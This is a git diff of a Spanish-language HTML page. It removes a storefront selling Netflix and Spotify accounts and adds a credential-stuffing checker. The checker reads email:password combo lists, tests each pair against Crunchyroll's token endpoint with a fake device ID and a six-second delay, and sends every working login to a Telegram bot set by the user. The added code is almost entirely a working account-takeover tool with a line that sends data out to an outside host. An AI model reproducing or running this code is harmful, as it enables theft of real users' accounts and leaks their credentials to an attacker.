@@ -3,74 +3,106 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tienda de Cuentas Streaming</title>
+    <title>Formulario de Token</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f4f4f4;
-            position: relative; /* Necesario para el posicionamiento absoluto del botón */
-        }
-        header {
-            background-color: #333;
-            color: white;
-            padding: 10px;
-            position: relative;
-        }
-        .contact-button {
-            position: fixed; /* Cambiado a fixed para que permanezca en la parte inferior izquierda */
-            bottom: 10px; /* Ajustado para estar a 10px del fondo */
-            left: 10px; /* Ajustado para estar a 10px del lado izquierdo */
-            background-color: #0078ff;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            cursor: pointer;
-            border-radius: 5px;
-        }
-        .contact-button:hover {
-            background-color: #005bb5;
-        }
-        .container {
-            padding: 20px;
-        }
-        h1 {
-            text-align: center;
-        }
-        .item {
-            background: white;
-            margin: 10px 0;
-            padding: 10px;
-            border-radius: 5px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        }
+        body { font-family: Arial, sans-serif; }
+        .hidden { display: none; }
+        #output { white-space: pre-wrap; }
     </style>
 </head>
 <body>
-    <header>
-        <h1>Tienda de Cuentas Streaming</h1>
-    </header>
-    <div class="container">
-        <div class="item">
-            <h2>Cuenta Netflix</h2>
-            <p>Descripción de la cuenta Netflix.</p>
-            <p>Precio: $10</p>
-        </div>
-        <div class="item">
-            <h2>Cuenta Spotify</h2>
-            <p>Descripción de la cuenta Spotify.</p>
-            <p>Precio: $5</p>
-        </div>
-        <!-- Puedes añadir más ítems aquí -->
+
+    <h1>Ingreso de Token</h1>
+    <div id="step1">
+        <label for="token">TOKEN BOT:</label>
+        <input type="text" id="token" placeholder="Ingresa tu token">
+        <button onclick="nextStep(1)">Siguiente</button>
     </div>
-    <button class="contact-button" onclick="contactSeller()">Contactar por Telegram</button>
+
+    <div id="step2" class="hidden">
+        <label for="id">ID:</label>
+        <input type="text" id="id" placeholder="Ingresa tu ID">
+        <button onclick="nextStep(2)">Siguiente</button>
+    </div>
+
+    <div id="step3" class="hidden">
+        <label for="filePath">FILE PATH:</label>
+        <input type="file" id="filePath" accept=".txt">
+        <button onclick="processFile()">Procesar Archivo</button>
+    </div>
+
+    <div id="output" class="hidden"></div>
+
     <script>
-        function contactSeller() {
-            var telegramUsername = '@hjofc';
-            var telegramLink = 'https://t.me/' + telegramUsername;
-            window.open(telegramLink, '_blank');
+        let token, userId;
+
+        function nextStep(step) {
+            if (step === 1) {
+                token = document.getElementById('token').value;
+                document.getElementById('step1').classList.add('hidden');
+                document.getElementById('step2').classList.remove('hidden');
+            } else if (step === 2) {
+                userId = document.getElementById('id').value;
+                document.getElementById('step2').classList.add('hidden');
+                document.getElementById('step3').classList.remove('hidden');
+            }
+        }
+
+        async function processFile() {
+            const fileInput = document.getElementById('filePath');
+            const file = fileInput.files[0];
+            if (file) {
+                const text = await file.text();
+                const lines = text.split('\n');
+                let output = '';
+
+                for (const line of lines) {
+                    if (line.includes(':')) {
+                        const [email, password] = line.split(':');
+                        const url = "https://beta-api.crunchyroll.com/auth/v1/token";
+                        const data = new URLSearchParams({
+                            "username": email,
+                            "password": password,
+                            "grant_type": "password",
+                            "scope": "offline_access",
+                            "device_id": generateDeviceId(),
+                            "device_name": "SM-G9810",
+                            "device_type": "samsung SM-G955N"
+                        });
+
+                        try {
+                            const res = await axios.post(url, data);
+                            if (res.data.refresh_token) {
+                                output += `𝘨𝘰𝘰𝘥 ☑️ >>>> [ ${email} | ${password} ]\n`;
+                                await sendMessageToTelegram(email, password);
+                            } else {
+                                output += `𝘦𝘳𝘳𝘰𝘳 ❌ >>>> [ ${email} | ${password} ]\n`;
+                            }
+                        } catch (error) {
+                            output += `𝘦𝘳𝘳𝘰𝘳 ❌ >>>> [ ${email} | ${password} ]\n`;
+                        }
+                        await new Promise(resolve => setTimeout(resolve, 6000));
+                    }
+                }
+
+                document.getElementById('output').textContent = output;
+                document.getElementById('output').classList.remove('hidden');
+            }
+        }
+
+        function generateDeviceId() {
+            return 'xxxxxxxxxxxxxxxx'.replace(/[x]/g, () => Math.floor(Math.random() * 16).toString(16));
+        }
+
+        async function sendMessageToTelegram(email, password) {
+            const response = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
+                chat_id: userId,
+                text: `${email}:${password}`
+            });
+            return response;
         }
     </script>
+
 </body>
 </html>
